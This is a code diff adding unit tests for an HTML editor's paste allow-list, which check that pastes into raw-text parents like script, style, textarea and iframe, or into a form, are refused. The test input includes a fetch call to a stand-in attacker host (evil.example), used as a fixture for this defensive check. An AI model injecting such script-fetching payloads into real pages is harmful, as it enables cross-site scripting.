@@ -218,3 +218,39 @@ describe('allow-list: data-bound content', () => {
     expect(reason).toMatch(/layers panel/i)
   })
 })
+
+describe('allow-list: the paste parent', () => {
+  function pasteInto(parent: string, html: string) {
+    const { indexed, engine } = open(canvas(`  ${parent}`))
+    return engine.apply(indexed, [insertHtml(findId(indexed, new RegExp(`^${parent.slice(0, parent.indexOf('>'))}`)), null, html)])
+  }
+
+  it.each([
+    ['<script>', '<script>var a = 1</script>'],
+    ['<style>', '<style>.a {}</style>'],
+    ['<textarea>', '<textarea>a</textarea>'],
+    ['<title>', '<title>a</title>'],
+    ['<noscript>', '<noscript>a</noscript>'],
+    ['<template>', '<template>a</template>'],
+    ['<iframe>', '<iframe>a</iframe>'],
+    ['<xmp>', '<xmp>a</xmp>'],
+    ['<noembed>', '<noembed>a</noembed>'],
+    ['<noframes>', '<noframes>a</noframes>'],
+  ])('refuses a paste inside a %s, whose content the parser reads as text', (tag, parent) => {
+    const html = "<meta charset=\"utf-8\">fetch('https://evil.example/'+1)"
+    expect(refusalOf(pasteInto(parent, html))).toBe(`nothing can be pasted inside a ${tag}`)
+  })
+
+  it('refuses a paste inside a <form>, which is not a pasteable container', () => {
+    expect(refusalOf(pasteInto('<form><p>a</p></form>', '<span>x</span>'))).toBe('nothing can be pasted inside a <form>')
+  })
+
+  it.each([
+    ['a <section>', '<section><p>a</p></section>'],
+    ['a custom element', '<x-card><p>a</p></x-card>'],
+    ['an <svg>', '<svg viewBox="0 0 1 1"></svg>'],
+  ])('pastes inside %s', (_case, parent) => {
+    const html = parent.startsWith('<svg') ? '<rect width="1" height="1"></rect>' : '<span>x</span>'
+    expect(pasteInto(parent, html).ok).toBe(true)
+  })
+})
